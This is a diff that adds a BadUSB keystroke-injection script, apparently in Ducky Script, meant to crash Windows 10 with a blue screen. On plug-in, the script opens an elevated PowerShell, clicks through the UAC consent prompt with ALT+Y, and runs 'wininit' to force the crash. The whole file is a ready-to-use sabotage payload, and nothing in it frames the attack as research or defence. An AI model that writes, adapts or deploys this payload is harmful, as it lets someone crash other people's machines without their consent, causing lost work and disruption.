@@ -1,0 +1,17 @@
+REM badusb BSOD 
+REM AUTHOR: QWERTY7030
+REM runs BSOD command in powershell
+REM TESTED ON WINDOWS 10
+REM V 1.O
+
+DEFAULT_DELAY 200
+DELAY 2000
+GUI r
+STRING powershell Start-Process powershell -Verb runAs
+ENTER 
+DELAY 3000
+ALT y
+DELAY 3000
+STRING wininit
+ENTER 
+REM :)
